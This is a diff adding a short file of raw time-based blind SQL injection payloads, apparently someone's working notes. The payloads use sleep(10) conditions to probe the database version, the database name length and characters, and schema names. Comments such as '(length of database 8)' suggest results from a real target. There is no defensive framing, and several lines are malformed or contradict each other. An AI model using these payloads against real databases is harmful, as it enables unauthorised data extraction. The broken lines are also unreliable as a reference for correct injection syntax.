@@ -1,0 +1,17 @@
+AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL)-- -
+%20AND+IF((SELECT+ascii(substr(version(),1,1)))%20>%2051,sleep(10),NULL)--%20-
+
+%20AND+IF((SELECT+ascii(substr(version(),1,1)))%20=%2053,sleep(10),NULL)--%20-   (length of version is 5)
+
+
+and if(length(database()) = 5, sleep(10), null)-- -
+and if(length(database()) = 5, sleep(10), null)-- -   (length of database 8)
+and if(substring(database(),1,1) > 'a', sleep(10), null)-- -
+current_user()
+table_name()
+
+and if(substr(select schema_name from information_schema.schemata > a, sleep(10), null)-- -
+
+%20AND%20IF(((ascii(len((SELECT%20schema_name%20FROM information_schema.schemata%20LIMIT 0,1),1,1))))%20>%2051,sleep(10),NULL)--%20-
+
+%20AND%20IF(((ascii(substr((SELECT%20schema_name%20FROM information_schema.schemata%20LIMIT 0,1),1,1))))%20>%2095,sleep(10),NULL)--%20-
